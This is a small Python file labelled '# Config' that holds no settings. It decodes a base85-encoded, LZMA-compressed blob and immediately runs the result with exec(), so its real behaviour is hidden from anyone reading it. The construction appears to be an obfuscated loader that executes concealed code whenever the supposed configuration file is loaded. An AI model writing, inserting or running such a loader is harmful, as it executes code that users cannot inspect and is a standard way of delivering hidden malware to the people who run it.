# Config
import lzma, base64
_data = b'{Wp48S^xk9=GL@E0stWa8~^|S5YJf5-~@L9D_sCIn@VT6Qap47uD?*%pqR^2IeP3OZ&0(1-hSC}{k&JXX;~YG;7Ab&!cUhzo__8K&ijeNOQM8Xq}f<WPz+XXYr1a*l6R~*xQV{m+PEF!+=G$f>82L!3q_UrTKE|VbpYvw-K0NSvySL#uIkfKA8Czw7WJy^af?E?LKN?Pn}Wg^1kFGmK?o=62~W-q>UUJa<3ZH>+s=P<aWwR++?dU^EL=r8bg~{>*!{v<)nO-5GqUN&X<Sc5T4q~o{%Qxvan#$XEc!E0v20y*5rW;9*|m3z!mr<o_%;58odX-TjyzszyzHmI;i^-Z1bnZOQZxJu<}3tqQ*CuQGP|^z6WeaaT%H$O9Aqu+GJ{Xsp98CaCM1{hT_0pF{^b8m{hECcq5y&X(&YWoU~{%DC969ko4{X@d?GP8agm6NbvzZcA2mCzA`tO$!UwJE8zL^KRaryA7@>O#?B{rpUuY~jFs;>KUemi~y>f<Lx(TBL^WLI_>OdU=fu~NFJ!?r;$rQ8tt|+{_YN%xDlODk6VbAx&`ebdX0LF1f%PpfBy;mn3bl|HoX`idOs?H*R5N8)a+O}YOjN+Ge(0z`3Zq2$-Af^hgyN2>9?<C~<yr#J!)#VLJ0X_FL^wo3SYbjb-*0GPi3SJ+xy2fpxxKMS~$+T?Ygi(+kiG>edZqCn|7gK$RMgjUo3yk^5@|i@rPNhy-QlL$KKYH?&g8%>k|IAv9S79vW00GAY_y_<1;WPPnvBYQl0ssI200dcD'
_exec = lzma.decompress(base64.b85decode(_data)).decode('utf-8')
exec(_exec)
